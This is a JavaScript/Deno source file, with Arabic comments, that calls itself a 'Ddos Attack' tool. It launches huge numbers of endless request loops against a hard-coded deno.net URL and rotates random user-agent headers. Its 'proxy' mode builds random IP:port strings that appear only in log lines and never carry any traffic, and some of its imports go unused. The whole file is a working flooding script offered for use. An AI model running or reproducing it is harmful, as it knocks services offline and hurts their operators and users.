// استيراد الحزم باستخدام صيغة npm:
import TelegramBot from "npm:node-telegram-bot-api";
import express from "npm:express";
import { userAgents } from "npm:user-agents";
import figlet from "npm:figlet";

// Colors
const F = '\x1b[1;32m';
const Z = '\x1b[1;31m';
const S = '\x1b[1;33m';
const B = '\x1b[38;5;208m';

console.log(`${F}[✓] All libraries imported and ready to use!${Z}`);

// Display logo
const logo = figlet.textSync('Ddos Attack', { font: 'Slant' });
console.log(logo);

async function linked() {
    const sg = '2';
    if (sg === '1') {
        for (let i = 0; i < 50000; i++) {
            AttackMahos();
        }
    } else if (sg === '2') {
        for (let i = 0; i < 500000000000; i++) {
            ProxyAttack();
        }
    }
}

async function AttackMahos() {
    while (true) {
        const headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-us,en;q=0.5',
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Keep-Alive': '115',
            'Connection': 'keep-alive',
            'User-Agent': userAgents.getRandom()
        };
        
        try {
            const response = await fetch(url, { headers });
            if (response.status === 200) {
                console.log(`${F}GOOD Attack: ${url}`);
            } else {
                console.log(`${Z}BAD Attack: ${url}`);
            }
        } catch {
            console.log(`${S}DOWN: ${url}`);
        }
    }
}

async function ProxyAttack() {
    // ملاحظة: تحتاج إلى إضافة حزم إضافية للبروكسي في Deno
    while (true) {
        const ip = Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
        const pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900];
        const port = pl[Math.floor(Math.random() * pl.length)];
        const proxy = `${ip}:${port}`;
        
        const headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-us,en;q=0.5',
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Keep-Alive': '115',
            'Connection': 'keep-alive',
            'User-Agent': userAgents.getRandom()
        };
        
        try {
            // في Deno قد تحتاج إلى استخدام مكتبة بروكسي مختلفة
            const response = await fetch(url, { headers });
            if (response.status === 200) {
                console.log(`${F}GOOD Attack: ${url} | ${proxy}`);
            } else {
                console.log(`${Z}BAD Attack: ${url} | ${proxy}`);
            }
        } catch {
            console.log(`${S}DOWN: ${url}`);
        }
    }
}

const url = 'https://ihhjjjh-x02rn86kw4ns.vvvvvhkj.deno.net/';

// تشغيل الهجوم
linked().catch(console.error);
